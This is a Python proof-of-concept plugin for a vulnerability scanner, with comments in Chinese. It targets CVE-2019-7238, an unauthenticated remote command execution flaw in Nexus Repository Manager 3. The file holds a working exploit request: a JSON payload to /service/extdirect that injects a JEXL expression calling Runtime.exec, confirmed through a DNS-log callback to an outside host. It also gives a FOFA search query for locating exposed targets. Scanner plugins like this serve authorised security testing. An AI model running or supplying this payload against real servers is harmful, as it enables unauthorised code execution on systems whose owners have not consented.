# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua, get_dnslogCN, check_dnslogCN
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "Nexus Repository Manager 3 远程命令执行漏洞（CVE-2019-7238）",  # 漏洞名称
        "VulnID": "CVE-2019-7238",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "Nexus Repository Manager 3",  # 漏洞应用名称
        "AppVersion": "Nexus Repository Manager 3 <= 3.14.0",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            Nexus Repository Manager 3 一个软件仓库，可用于存储和分发Maven、NuGET等软件源仓库。其3.14.0及之前版本中，存在一处基于OrientDB自定义函数的任意JEXL表达式执行功能，而这处功能存在未授权访问漏洞，将可能导致任意命令执行漏洞。
        """,  # 漏洞简要描述

        "fofa-dork": """
            app="Nexus-Repository-Manager"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        url = self.target + "/service/extdirect"  # url自己按需调整
        sucess, flag = get_dnslogCN()
        if sucess != True:
            return vuln

        headers = {
            "User-Agent": get_random_ua(),
            "Connection": "close",
            "Content-Type": "application/json",
        }
        body = """
{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":50,"sort":[{"property":"name","direction":"ASC"}],"filter":
[{"property":"repositoryName","value":"*"},{"property":"expression","value":"233.class.forName('java.lang.Runtime').getRuntime().exec('ping %s')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":8}""" % (flag)
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url, data=body, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            if check_dnslogCN(flag):  # req.status_code == 200 and :
                vuln = [True, req.text]
            else:
                vuln = [False, req.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
